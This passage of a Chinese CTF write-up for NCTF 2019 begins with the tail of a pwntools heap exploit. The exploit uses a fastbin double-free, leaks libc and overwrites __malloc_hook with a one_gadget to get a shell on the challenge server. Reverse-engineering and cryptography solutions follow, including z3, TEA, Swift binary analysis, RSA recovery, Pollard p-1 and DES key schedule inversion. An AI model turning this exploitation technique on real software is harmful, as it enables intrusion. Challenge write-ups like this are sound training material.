    r.recvuntil("4. exit\n")
    return data

#r = process("./easy_heap")
r=remote('0.0.0.0',9998)
r.recvline("What's your name?\n")
r.send(p64(0) + p64(0x61))

r.recvuntil("4. exit\n")

add(0x50, "w4rd3n")#0
add(0x50, "w4rd3n")#1
dele(0)
dele(1)
dele(0)
add(0x50, p64(0x602060))
add(0x50, "w4rd3n")
add(0x50, "w4rd3n")
add(0x50, p64(0) * 1 + p64(0xfffffffffffffff) + p64(0x601FB0) + p64(0) * 7)

libc = u64(show(0).ljust(8, "\x00")) + 0x7f26f36a5000 - 0x7f26f3714690

add(0x60, "w4rd3n")#1
add(0x60, "w4rd3n")#2
dele(1)
dele(2)
dele(1)
add(0x60, p64(libc + 0x3c4b10 - 0x23))#3
add(0x60, "w4rd3n")#4
add(0x60, "w4rd3n")#5
add(0x60, "0" * 0x13 + p64(libc + 0x45390))

print "libc: " + hex(libc)

r.sendline("1")
r.sendlineafter("What's your heap_size?\n", str(libc + 0x18cd57))

r.interactive()
```

## REVERSE
### DEBUG[87pt 106solvers]
```
==Difficulty: easy==

flag格式NCTF{.*}

此题单纯考察调试

flag一调就出哦~~~

==Author psb==
```

rc4把加密的flag解密后直接比较
会双机联调就能出
https://www.cnblogs.com/wanyuanchun/p/5117553.html
可自行百度
NCTF{just_debug_it_2333}

### 签到题[125pt 71solvers]
```
==Difficulty: easy==

flag格式NCTF{.*}

不知道同学们线代考的怎么样啊

==Author psb==
```

听说上周学弟考了线代就出了一道
本来想把顺序打乱后来觉得没必要就直接上了

```c
# -*- coding: UTF-8 -*-
from z3 import *
a = [12, 83, 78, 39, 23, 27, 4, 53, 85, 53, 78, 6, 85, 6, 6, 12, 24, 52, 14, 92, 3, 34, 73, 36, 9, 74, 42, 67, 58, 27, 86, 62, 48, 48, 0, 36, 96, 25, 37, 12, 15, 26, 1, 52, 46, 84, 83, 72, 68]
b = [18564,
  37316,
  32053,
  33278,
  23993,
  33151,
  15248,
  13719,
  34137,
  27391,
  28639,
  18453,
  28465,
  12384,
  20780,
  45085,
  35827,
  37243,
  26037,
  39409,
  17583,
  20825,
  44474,
  35138,
  36914,
  25918,
  38915,
  17672,
  21219,
  43935,
  37072,
  39359,
  27793,
  41447,
  18098,
  21335,
  46164,
  38698,
  39084,
  29205,
  40913,
  19117,
  21786,
  46573,
  38322,
  41017,
  29298,
  43409,
  19655]
s = Solver()
key = [BitVec('u%d'%i,8) for i in range(49)]
for i in range(7):
    for j in range(7):
        s.add(b[i*7+j] == key[i*7]*a[j]+key[i*7+1]*a[7*1+j]+key[i*7+2]*a[7*2+j]+key[i*7+3]*a[7*3+j]+key[i*7+4]*a[7*4+j]+key[i*7+5]*a[7*5+j]+key[i*7+6]*a[7*6+j])
flag = ''
if s.check() == sat:
    result = s.model()
    for i in range(49):
        flag += chr(result[key[i]].as_long().real)
    print flag
```

### 难看的代码[435pt 14solvers]
```
==Difficulty: medium+++==

flag格式NCTF{.*}

==Author psb==
```

为了降低难度没出太狠
有些bug没来得及改
俩层smc 花指令 和一些反调试
主要目的是考察抗动态分析与静态分析的技术不是算法
所以加密部分就是单纯的加法xor和tea

```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
unsigned char dword_403020[] =
{
  0x78, 0x56, 0x34, 0x12, 0x0D, 0xF0, 0xAD, 0x0B, 0x14, 0x13,
  0x20, 0x05, 0x21, 0x43, 0x65, 0x87
};
void decrypt (char* a1, unsigned int* k) {
    unsigned int v0=*(unsigned int *)a1, v1=*(unsigned int *)(a1+4), sum=0xC6EF3720, i;  /* set up */
    unsigned int delta=0x9e3779b9;                     /* a key schedule constant */
    unsigned int k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<32; i++) {                         /* basic cycle start */
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }                                              /* end cycle */
    *(unsigned int *)a1=v0; *(unsigned int *)(a1+4)=v1;
}
int main()
{
    unsigned char a1[] = {0x5E, 0x9F, 0x86, 0x61, 0x8D, 0xF0, 0x9C, 0x0A, 0xCA, 0xC0,
  0x74, 0xAD, 0xB8, 0x16, 0x7F, 0xA5, 0x6D, 0x62, 0x59, 0xB5,
  0xE0, 0x68, 0x7B, 0xD1};
  int i,j;
  for(j=0;j<24;j+=8)
  {
  decrypt(a1+j, &dword_403020);
  }

  for(j=0;j<24;j++)
  {
      a1[j] ^= 0x5Au;
      a1[j] = (((unsigned __int8)a1[j] >> 3) | (a1[j]<<5))&0xff;
  }
    for ( i = 0; i < 6; i += 4 )
  {
    a1[i] -= 0xC;
    a1[i + 1] -= 0x22;
    a1[i + 2] -= 0x38;
    a1[i + 3] -= 0x4E;
  }
  for(i=0;i<24;i++)
    printf("%c",a1[i]);
    return 0;
}

```

这题目py现象及其严重，查看校内校外wp有5-6篇几乎一模一样（除个别）
花指令可以去除后直接反编译出来
反调试只是单纯把isdebuggerpresent等函数用汇编实现
可以用sod绕，当时没想到 //早知道就整个elf了
smc处程序把保存在data段的eixt(0)机器码给了下一个函数
反调试(嵌套)处判断是否调试，如果在的话就不把原来的代码段还原，所以执行到下一个函数会直接exit
如果直接nop第一个反调试也会直接exit //毕竟下面打印了很明显的字符串

### math_easy[1000pt 1solver]
```
==Difficulty: easy==

最近对数学很感兴趣

nc 139.129.76.65 60007

Hint1: AES DFA

Hint2: PhoenixAES

==Author psb==
```

根据xctf-final的题目改编的一道题
了解原理后其实很简单
https://blog.quarkslab.com/differential-fault-analysis-on-white-box-aes-implementations.html
把fault放在最后mc前影响输出四个字节
通过多组数据可以爆破
或者用现成的工具 //上面blog上有提到

### 你大概需要一个带bar的mac[1000pt 0solver]
```
==Difficulty: hard==

aiQG plays games in the 21st century. (You can run this game on MasOS. //You might also need a touchbar)

Hint: 密文在__data:000000010000B140 到 __data:000000010000B168 处

==Author aiQG==
```

//这是一个macOS下用swift5 + SpriteKit框架写出来的touchbar上的游戏
考虑到有mac的师傅并不多，所以这里提供一个静态分析的解法...(主要就是考静态分析)

得到的是一个后缀为.app的文件夹(macOS下的应用)。Contents\MacOS下有一个
```touchbarGame```这个就是游戏本体

> 关于.app里各个文件：
> \_CodeSignature文件夹 是各个文件的数字签名防止被篡改
> Resources文件夹 是各种资源文件
> MacOS文件夹 是此App的真正可执行文件
> Info.plist文件 是App的基本信息(比如最低系统版本要求, 版本号, Copyright等等标识)
> PkgInfo文件 是一个可选的8个字节长度的文件, 可保存程序类型和创建者签名(当然这些可以写在 Info.plist 中), 这个文件通常包含四字节的程序类型信息(通常为 APPL)和四个字节的签名信息(比如 System Preferences.app 的 PkgInfo 就是 APPLsprf)
> &gt;Assets.car中保存着资源图片

[//关于资源文件Assets.car的分析链接](https://blog.timac.org/2018/1018-reverse-engineering-the-car-file-format/)
Assets.car文件可以提取出资源图片(似乎有在线提取的, 但是并不能提取出全部的东西) (关于提取资源, 似乎没有找到非macOS上的现成工具)

![mac3](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t0144f2acca318c4bb3.png)

![mac4](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t016a3cf9a248ee7b3d.png)

可以看到有"shot","rock"和"enemy"的图片, 猜测是"打飞机的游戏"(跑不起来只能猜了呗...)
//这个游戏打起来是这样的......

![gaming](http://aiQG.vip/wp-content/uploads/2019/11/gamingL.gif)

ida分析touchbarGame可以看到函数里有Objective-C的方法和swift的函数, 大多数的函数的名字ida都给分析出来了//所以猜测个别函数的作用还是比较简单的

![mac1](http://aiQG.vip/wp-content/uploads/2019/11/mac1.png)

> OC调用函数的机制是"send message"(OC的Runtime), 相当于在运行时才确定函数调用, 所以ctrl+x查看函数的交叉引用几乎是找不到啥信息的了

因为无法运行(无法知道程序输入输出), 我们可以找找程序中的字符串, 提取关键信息


+ 发现有个"/114514) R(estart)"
//114514???
我们交叉引用跟过去到```sub_100002190```, 发现这个函数里OC发了很多带"set"的消息, 可以推断这里是初始化整个游戏的位置
那这个字符串应该就是一个(提示重新开始的)Label


+ 可以找到头的信息

![mac2](http://aiQG.vip/wp-content/uploads/2019/11/mac2.png)

看到使用了几个框架, google一下发现SpriteKit这个框架有"Physics Simulation"的class, 其中有一个[SKPhysicsContact](https://developer.apple.com/documentation/spritekit/skphysicscontact)看Apple文档的描述可以发现这个东西和物体的接触(碰撞)有关(因为这是个游戏, 所以检测碰撞的功能是一个关键的位置)
继续往下看文档, 有两个变量```bodyA```和```bodyB```
由于OC执行函数的机制(发消息), 我们可以在字符串中搜到这两个变量的名字, 并且可以交叉引用找到给Runtime System 发消息的函数```sub_1000034C0```

![mac5](http://aiQG.vip/wp-content/uploads/2019/11/mac5.png)

//也可以尝试搜索一下包含"print"的函数, 找到```_$ss5print_9separator10terminatoryypd_S2StF```, 发现有两处调用了这个函数, 而且也都在```sub_1000034C0```里

可以仔细分析一下```sub_1000034C0```函数
发现有几个立即数, 很明显是字符串

![mac6](http://aiQG.vip/wp-content/uploads/2019/11/mac6.png)

"hit player"
显然这是一个swift 调用print 的结构, 再往下看看能找到类似的结构

![mac7](http://aiQG.vip/wp-content/uploads/2019/11/mac7.png)

"hit enemy"

显然这个函数判断了触发碰撞的是哪两个物体

再仔细看一下"hit player"下面的部分, 又发现了一个字符串

![mac8](http://aiQG.vip/wp-content/uploads/2019/11/mac8.png)

"Game Over"
是个Label, 并且这个Label是和"hit player"处于同层(同一个if), 可以推断游戏如果触发了"hit player"必定触发"Game Over"

//```_sSS5write2toyxz_ts16TextOutputStreamRzlF```函数其实在给Label初始化字符串

//其实在"hit player"下面很近的地方就能找到"KilledPlayer", 在"hit enemy"下面很近的地方能找到"killEnemy". 这两个位置其实是调用了Resources文件夹里两个.sks的粒子文件

![mac9](http://aiQG.vip/wp-content/uploads/2019/11/mac9.png)

接下来主要分析一下"hit enemy"部分的代码
很容易看见有个if判断了一个变量的数值是否为114514, 之前的分析也发现了这个奇怪的值(而且是在字符串里), 很可疑,  重点关注

![macA](http://aiQG.vip/wp-content/uploads/2019/11/macA.png)

v53[v115]这个变量可以往回追溯, 发现

![macB](http://aiQG.vip/wp-content/uploads/2019/11/macB.png)

v53 来自 v124, 
```OBJC_IVAR____TtC12touchbarGame17TouchbarGameScene_score```这个常量的值是0x28, v115的值同样也是```OBJC_IVAR____TtC12touchbarGame17TouchbarGameScene_score```, 并且这个名称一看就和分数有关, 并且```v28 = v26 + 1```这个位置很明显是分数加一
因此那个if其实是在判断分数是否为114514

继续分析判断分数为114514后程序执行了什么
能看到这个if最后有个goto

![macC](http://aiQG.vip/wp-content/uploads/2019/11/macC.png)

跳过了对一个变量的赋值(赋0), 并且这个变量最后会被放到一个Label里//并且可以看到"setPosition"消息的参数和"Game Over"Label的"setPosition"参数一样, 说明这两个东西出现的位置相同, 但内容必定不同///而且v65是经过了一个while运算(其实是一个数值往字符串转换的操作)
//这里需要注意一下由于Swift是类型安全的. 所以, 数值并不能直接转成字符(其实程序在判断分数为114514后, 执行的是一个数值转字符串的操作)

那么我们主要分析一下从得分("hit enemy")到判断分数为114514(打印flag)之间的内容(因为可以推断这里面很可能有对flag数组加解密的操作)

首先能看到好几个常量字符串

![macD](http://aiQG.vip/wp-content/uploads/2019/11/macD.png)

"remove"了两个"body", 然后播放了一个动画(去查了查Apple开发者文档, 发现SKAction是一个用来播放动画的class)

接着能看见```OBJC_IVAR____TtC12touchbarGame17TouchbarGameScene_flagArr```这个变量, 它和前面的```OBJC_IVAR____TtC12touchbarGame17TouchbarGameScene_score```有相同的前缀```OBJC_IVAR____```, 所以我们可知这里也是一个变量(其实是一个数组), 这个变量被传递到后面进行了一个计算

![macE](http://aiQG.vip/wp-content/uploads/2019/11/macE.png)

我们可以稍微整理一下得到
```*(v34 + v116%v31 + 0x20) ^= v32``` 
其中```v32```和```v116```是得到的总分数
```v31(=v30+0x10)```是数组的长度
```v34+0x20```处是数组第0个元素的位置
再整理一下可以得到
```(Arr + score%Arr.length) ^= score```
(注意这里有个数据类型的转换, ida下按'\\'键显示)
//中间的两个if是swift内存安全的检查, 防止数组越界造成内存泄露

//关于Swift数组的结构:

![swiftArr](http://aiQG.vip/wp-content/uploads/2019/11/swiftArr.png)

按照这个结构可以在```__data:```段里找到多个像这样相同的数组

![flagArr](http://aiQG.vip/wp-content/uploads/2019/11/flagArr.png)

---

到这里这个函数的功能就整理清楚了
判断是"player"发生了碰撞, 还是"enemy"发生了碰撞. 

- 如果是"player"发生碰撞, 则"Game Over";
- 如果"enemy"发生碰撞, 则: 
1. 初始化killEnemy.sks的粒子
2. 分数+1
3. **对flagArr数组进行运算**
4. 移除bodyA
5. 移除bodyB(移除两个发生碰撞的物体)
6. 按照"killEnemy.sks"文件生成粒子
7. 检查分数是否为114514, 如果分数为114514, 则生成一个字符串; 否则不生成字符串
8. 如果生成了字符串, 则生成一个Label

---

那我们主要关注对flagArr计算的位置
由于只在```__data:```段里找到了一个数组(多个相同的), 那我们可以尝试一下解这个数组

```swift
var flagArr:[UInt8] = [55, 32, 78, 37, 55, 98, 241, 242, 147, 177, 160, 31, 70, 34, 15, 60, 231, 178, 146, 144, 239, 20, 98, 114, 78, 30, 141, 151, 136, 185, 197, 51, 124, 61, 75, 111, 157, 205, 239, 232, 237]

var flag = ""

for i in 1...114514 {
	flagArr[i%flagArr.count] = flagArr[i%flagArr.count] ^ UInt8(i & 0xFF)	
}

for j in flagArr {
	flag += String(UnicodeScalar(j))
}

print(flag)

```

可解出flag

---

//关于指针的问题
可以看到程序中很多的指针, 这是swift(OC)de Runtime性质, 在分析的时候不必过度地纠结指针到底指向什么东西(除非想要深入了解OC的Runtime机制)




### Easy Ternary[769pt 4solvers]
```
==Difficulty: medium==

aiQG is learning ternary by binary.

Hint: AHK

==Author aiQG==
```

exe里就有源码。。。

![T1](http://aiQG.vip/wp-content/uploads/2019/11/T1.png)

google搜一下知道是AHK写的(其实如果有优秀的PE信息查看工具也能查出来)![T2](http://aiQG.vip/wp-content/uploads/2019/11/T2.png)
搜AHK反编译, 搜到反编译工具Exe2Ahk。。。![T3](http://aiQG.vip/wp-content/uploads/2019/11/T3.png)//运行需要安装AHK环境
源码如下

```ahk

XOR(a, b)
{
	tempA := a
	tempB := b
	ret := 0
	Loop, 8
	{
		ret += Mod((((tempA >> ((A_Index - 1)*4)) & 15) + ((tempB >> ((A_Index - 1)*4)) & 15)),3) * (16**(A_Index-1))
	}
	return ret
}
InputBox, userInput, TTTTCL, Input your flag:
if(ErrorLevel)
	Exit
if(!StrLen(userInput))
{
	MsgBox, GG
	Exit
}
inputArr := []
Loop, parse, userInput
{
	temp:=A_Index
	inputArr.Push(Ord(A_LoopField))
}
inputNum := []
Loop % inputArr.Length()
{
	temp := inputArr[A_Index]
	temp := DllCall("aiQG.dll\?ToTrit@@YAII@Z", "UInt", temp)
	inputNum.push(temp)
}
key1 := XOR(inputNum[5], inputNum[inputNum.Length()])
inputFlag := []
Loop % inputArr.Length()
{
	temp := XOR(inputNum[A_Index], key1)
	if(Mod(A_Index,2))
	{
		temp := XOR(key1,temp)
	}
	inputFlag.push(temp)
}
temp1 := 1
Loop % inputFlag.Length()
{
	temp := inputFlag[A_Index]
	temp := DllCall("aiQG.dll\?Check@@YAIII@Z", "UInt", temp, "UInt", A_Index)
	if(!temp)
	{
		temp1 := 0
	}
}
if(temp1)
{
	MsgBox, Ok
}
if(!temp1)
{
	MsgBox, GG
}
steamGroup = "steamcommunity.com/groups/sastGame"
```

//语法什么的AHK都有官方的文档
这里主要是实现了一个模三加法, 然后每一位用四比特表示

exe先获取输入, 然后转成数字, 然后调用了dll里的```ToTrit```函数, 然后算了一个key(第五个和最后一个字符模三加), 然后进行encode, 最后调用dll里的```Check```函数
稍微分析一下```ToTrit```函数可知这是一个转三进制的函数(由于每一位用4比特表示, 所以可以转成十六进制直接查看每一位)
```Check```函数里只有一个数组判断, 这个数组每一项转换成十六进制都只有0, 1, 2 三个数字

按照模三加稍微逆运算一下就好了

### Our 16bit Games[278pt 27solvers]
```
==Difficulty: easy==

aiQG plays games in the 20th century. (You can run this game on a 32 bit system, or use the DOSBox)

==Author aiQG==
```

按照flag的格式可以爆破出来(最多也就爆破两个字节, 利用前面的判断跳转, 可以大大减少爆破难度, 甚至直接确定正确的key)
key是```0xc0de```


### tsb[1000pt 1solver]
```
==Difficulty: medium==

tsb

Hint: “黑盒”

==Author MozhuCY==
```

使用stl实现了一个二叉搜索树,先是以80为根节点,将输入的flag按照格式取出括号内内容,然后遍历二叉树,将flag再次替换每个节点的值,然后利用队列进行层级遍历,最后得到的字符串进行比较.

不过这个题,预期和出题人的预期不太一样,一开始是先考察`C++`的逆向,还可以有一些比较偏技巧性的黑盒测试等,但是由于这个树不是二叉平衡树,所以导致树形不固定,黑盒测试的数据也会影响黑盒测试的结果,也就是说黑盒测试在本题是行不太通的(当然有可以的师傅可以私下交流一下),比赛中有一个队伍通过猜测flag组合的方式减小了穷举的范围,虽然偏脑洞一些,但是也好像是这个题目前比较现实的解法,所以本题只能是练习`C++`逆向的题目了,`C++`逆向其实和其他语言的逆向差不多,只不过将一些逻辑模块化,比如`C++`的`string`对象,其实在底层就是一个结构体,大家可以通过编写一些demo,然后配合ida,进行对`C++`逆向的学习.当然如果早已经看出来题目的逻辑,那么应该就已经掌握了`C++`的技巧了.

包括一些常见的数据结构的识别,比如树(哈夫曼树经常出现),栈,队列什么的,也可以通过上面的方法进行学习,还可以通过重写stl加深理解.


## CRYPTO
Crypto的wp，推荐看这篇：http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html
Crypto题目所有附件：http://www.soreatu.com/ctf/files/NCTF%202019.zip

### Keyboard[123pt 72solvers]
**Description**
```
==Difficulty: intuitive==

The plaintext is a string of meaningful lowercase letters, without whitespace.

Please submit the result with "NCTF{}" wrapped.

==Author: Soreat_u==
```

**Introduction**

毕竟校赛，总得出一道送分题。

**Analysis**

```
ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee
```

不难发现这些字母都是键盘上英文字母第一排的。

![image-20191125180140109](https://ps.ssl.qhmsg.com/t01ad796d4c168c68d1.png)

不难想到，这些字母就对应着数字`1, 2, 3, ..., 9`。

```
q -> 1
w -> 2
e -> 3
r -> 4
t -> 5
y -> 6
u -> 7
i -> 8
o -> 9
```

每个字母出现的次数都在1-4这个范围内，再根据题名`Keyboard`，不难再联想到**九宫格键盘**。

![image-20191118162747163](https://ps.ssl.qhmsg.com/t01ca18e3818cc95f98.png)

那么答案就很明显了。

**Exploit**

贴脚本：

```python
cipher = 'ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee'
s = ' qwertyuiop'
d = ['', '', 'abc', 'def', 'ghi', 'jkl', 'mno', 'pqrs', 'tuv', 'wxyz']

for part in cipher.split(' '):
    # print(part)
    count = len(part)
    num = s.index(part[0])
    print(d[num][count - 1], end='')

```

得到`youaresosmartthatthisisjustapieceofcake`

加上`NCTF{}`即为flag：`NCTF{youaresosmartthatthisisjustapieceofcake}`

**Summary**

是不是有点太脑洞了？但是题名的提示已经很明显了，这点脑洞总应该有的吧？

### Sore[667pt 6solvers]
**Description**
```
==Difficulty: easy==

Can you break the “unbreakable” cipher?

==Author: Soreat_u==
```

**Introduction**

灵感来源于西湖论剑线下赛的一道密码题VVVV。

本题是一个扩展版（字母表从26个小写字母扩展到52个大小写字母）的`Vigenere Cipher`，挺简单的啊。

**Analysis**

具体分析见我写的Cryptanalysis of Vigenere Cipher:  http://www.soreatu.com/essay/Cryptanalysis of Vigenere Cipher.html

**Exploit**

可以参考上面我写的`Cryptanalysis of Vigenere Cipher`。

不过，Google随便搜一个`Vigenere Cipher decoder`： https://www.guballa.de/vigenere-solver 

![image-20191125183055760](https://ps.ssl.qhmsg.com/t016de13efa9e772d0a.png)

都能秒解。

区分一下大小写就能出flag了。

NCTF{vlbeunuozbpycklsjXlfpaq}


### babyRSA[526pt 10solvers]
**Description**
```
==Difficulty: baby==

I forget the modulus. Can you help me recover it?

==Author: Soreat_u==
```

**Introduction**

主要考察对RSA几个参数之间关系的理解。

本题考点在于，如何从加密指数`e`和解密指数`d`中算出`p, q `，进而恢复出模数`n`。

如果已知`e, d, n`，是可以很轻松地按照下面这个算法算出两个大质数`p, q`的：

![1571317572853](https://ps.ssl.qhmsg.com/t01fe44a1f20691c234.png)

然而本题没有给出`n`，而且要求的就是`n`，所以这个算法不可行。

本题需要从RSA的这几个参数之间的关系出发去思考。

**Analysis**
> 这边不太支持`LaTex`语法。。

只要算出$n$即可解密。

首先有，
$$
e\cdot d \equiv 1 \quad (\text{mod}\ \phi(n))
$$
将同余式改写成等式，
$$
e\cdot d = k\cdot \phi(n) + 1
$$
> 其中$k$为整数，我们先来估算一下$k$的大致范围。

也就是，
$$
e\cdot d - 1 = k\cdot \phi(n)
$$


等式左边均已知，等式右边是$\phi(n)$的倍数。

实际上，

$$
\phi(n) \approx n, e = 65537, d &lt; n
$$
所以
$$
k &lt; e = 65537
$$
只需**穷举**小于65537且能整除$ed - 1$的所有$k$，即可得到所有可能的$\phi(n)$

而本题使用的$p, q$十分接近（相差几百左右）。

在算出可能的$\phi(n)$后，可以尝试求`p, q`：
$$
(p-1)^2 &lt; \phi(n) = (p - 1)(q - 1)  ^2
$$
如果尝试对$\phi(n)$开根取整，再在这个根的附近（$\pm2000$）去寻找能够整除$\phi(n)$的数，如果找到了，那么基本上就是$p-1$或者$q-1$。

有了$p-1$，就能算出$p$和$q$，相乘即可得到$n$。有了$c, d, n$，直接解密即可得到flag。

**Exploit**

需要`gmpy2`库，安装可参考[pcat - gmpy2安装使用方法](https://www.cnblogs.com/pcat/p/5746821.html )

```python
#!/usr/bin/python2

from Crypto.Util.number import *
import gmpy2

e = 65537
d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913
c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804
kphi = e*d - 1

for k in range(1, e):
    if kphi % k == 0:
        phi = kphi // k
        root = gmpy2.iroot(phi, 2)[0]
        for p in range(root - 2000, root + 2000):
            if phi % (p-1) == 0: break
        else: continue
        break

q = phi//(p-1) + 1
m = pow(c, d, p*q)
print(long_to_bytes(m))

# 'NCTF{70u2_nn47h_14_v3ry_gOO0000000d}'
```

大概3s内就能得出flag。

**Summary**

这一题，还是希望大家能够对RSA的几个参数之间的关系有一个深入的了解。

### childRSA[213pt 38solvers]
**Description**
```
==Difficulty: baby==

3072-bit RSA moduli are sufficiently sucure in several years. How about this 10240-bit one?

==Author: Soreat_u==
```

**Introduction**

最近在看一些`整数分解的算法`，其中有一个就是`Pollard's p-1 method`。

前几天又正好在先知社区上看到了一篇`Pollard's rho algorithm`的文章： https://xz.aliyun.com/t/6703 ，联想到一个`Pollard's p-1 method`。

*An Introduction to Mathematical Cryptography*书中说到：

![image-20191118141008696](http://www.soreatu.com/ctf/writeups/img/image-20191118141008696.png)

有的时候（极少情况），RSA模数的位数越高并不意味着安全性越高。

存在一些比较特殊的模数，很容易被分解。

这个分解算法就叫做`Pollard's p-1 method`。

于是，就根据这个算法出了这一道题。

**Analysis**

这一题的**关键**是如何将分解`n`成两个`5120`位的大质数`p, q`。

首先，`p,q`由`getPrime`函数生成：

![image-20191118141240309](http://www.soreatu.com/ctf/writeups/img/image-20191118141240309.png)

其中，`primes`是`Crypto.Util.number`模块中定义的前10000个质数。在`VScode`中按`F12`即可跳转到定义处。

![image-20191118141507996](http://www.soreatu.com/ctf/writeups/img/image-20191118141507996.png)

可以看到，最大的质数是`104729`。

一般来说，我们寻找大质数都是随机生成一个大数，然后将其经过素性测试，能够通过的就返回。

但是这一题里面，并不是这样生成的。

我们可以看到，`getPrime`生成的质数，都是由前10000个质数累乘起来然后再加1生成的。

这就使得生成的质数`p`，将其减一后，其结果（也就是这个质数的欧拉函数`p-1`）能够被分解为许多个相对来说很小的质数。这在数学上有一个专门的术语，叫做`B-smooth`。很显然，`p`是`104729-smooth`的。

> 关于`smooth number`的定义，请参考wiki： https://en.wikipedia.org/wiki/Smooth_number 

---

`smooth`有什么坏处呢？

我们先来看一个叫做**费马小定理**的东西：
$$
a^{p-1} \equiv 1 \quad (\text{mod}\ p)
$$
也就是说，指数那边每增加 $p-1$，其结果仍然不变。指数以 $p-1$ 为一个循环。

我们将其变形一下，
$$
a^{p-1} - 1 \equiv 0 \quad (\text{mod}\ p)
$$
模p同余0，也就是说 $a^{p-1} - 1$ 是 $p$ 的倍数。

将同余式改写为等式，
$$
a^{t \times (p-1)} - 1 = k\times p
$$
> 其中 $t, k$ 是两个整数。

如果指数$exp$是 $p-1$ 的倍数，那么$a^{exp} - 1 $就会是 $p$ 的倍数。

> 上面的$p$均指某一个质数，而非`N = pq`中的`p`

这里很关键。

如果我们能够找到一个指数$L$，使得对于某一个底数$a$，$a^{L} - 1$ 是`p`的倍数，但不是`q`的倍数。

这时，我们只要去计算
$$
gcd(a^{L}-1, N)
$$
得到的结果，必定是`p`。也就是说，我们成功地分解了`N`。

---

那么，怎么去找到这个$L$呢？

`Pollard`的厉害之处就在于此，他发现，如果`p-1`正好是一些很小的质数的乘积，那么`p-1`就能整除$n!$，其中$n$是一个不太大的数。

为什么呢？说下我自己的理解。

假设`p-1`是`p1, p2, ..., pk`这些质数的乘积，其中最大的质数是`pk`。那么，很显然`pk!=1·2·...·pk`肯定包括了`p1, p2, ..., pk`这些质数的乘积，`pk!`肯定是`p-1`的倍数。

也就是说，$n &gt; pk$ 的时候，$n!$很大概率上就能被`p-1`整除。（考虑到`p1, p2, ..., pk`中可能有重复的情况）

这导致了`Pollard' p-1 method`：

对于每一个$n = 2, 3, 4, ...$，我们任意选择一个底数$a$（事实上，我们可以简单地选择为2），并计算
$$
gcd(a^{n!-1}, N)
$$
如果结果落在1和$N$中间，那么我们就成功了。

![image-20191118145326515](http://www.soreatu.com/ctf/writeups/img/image-20191118145326515.png)

---

实际操作中，这个算法有很多可以优化的地方。

例如，我们并不需要算出$a^{n!-1}$的确切值，当$n&gt;100$时，$n!$本身就已经很大了，整体结果肯定巨大无比。我们每一次只需要算出$a^{n!-1}\ \text{mod}\ N$的值即可，可以将运算结果限制在模$N$的范围内。

这一题，实际上我们已经知道了最大的质数为`104729`，我们大概只需要算到$n = 104729$就可以了（不考虑`p-1`的构成中有几个重复的比较大的质数）。

并不需要每一个$n$都去算一遍$gcd(a^{n!-1}, N)$，每隔一个恰当的间隔去算就可以了。

**Exploit**

先自己照着算法流程实现一下`Pollard's p-1 method`：

```python
from Crypto.Util.number import *

def Pollard_p_1(N):
    a = 2
    while True:
        f = a
        # precompute
        for n in range(1, 80000):
            f = pow(f, n, N)
        for n in range(80000, 104729+1):
            f = pow(f, n, N)
            if n % 15 == 0:
                d = GCD(f-1, N)
                if 1 < d < N:
                    return d
        print(a)
        a += 1
```

然后就直接去分解这个`10000+`位的`N`。

```python
n = 1592519204764870135...
print( Pollard_p_1(n) )
```

大概跑个十几分钟（由于这个`N`太大了，十万次左右的快速幂还是需要点时间的），能分解出来：

![image-20191118152113507](http://www.soreatu.com/ctf/writeups/img/image-20191118152113507.png)

后面就是正常的RSA解密了。

```python
from Crypto.Util.number import *

n = 1592519204764870135...
c = 5744608257563538066...
p = 5075332621067110585...
q = n // p
assert(p*q == n)

d = inverse(0x10001, (p-1)*(q-1))

m = pow(c, d, n)
print(long_to_bytes(m))
# b'NCTF{Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3}'
```

**Summary**

出这一道题的目的，还是希望能让大家去深入了解某些算法背后的原理。

> 不过看大家好像都是用`yafu`直接分解的。。。。而且还挺快的。

后面应该会写一篇总结各种因数分解算法的文章的。

### Reverse[909pt 2solvers]
**Description**
```
==Difficulty: easy==

DES has a very bad key schedule.

==Author: Soreat_u==
```

**Introduction**

当初在学[DES](https://www.youtube.com/watch?v=kPBJIhpcZgE)的时候，就意识到DES的Key schedule是可以直接逆回去的。

具体的DES算法： https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf 

![image-20191125182055866](http://www.soreatu.com/ctf/writeups/img/image-20191125182055866.png)

leak出的Kn[10]应该是第11组子密钥$K_{11}$。

PERMUTED CHOICE 2是一个56 bits至48 bits的置换。可以穷举被truncated的8bits，逆一下对$K_{11}$的PERMUTED CHOICE 2即可返回到`C11 D11`。

再沿着那个长流程顺下去（`Ci`, `Di`经过16次`LEFT SHIFTS`后会复原），就可以恢复出所有子密钥。

**Exploit**

贴上半年前写的`exp.py`:

```python
from base64 import b64decode
from itertools import product
from DES import * 			 # https://github.com/soreatu/Cryptography/blob/master/DES.py


guess_8bit = list(product(range(2), repeat=8))
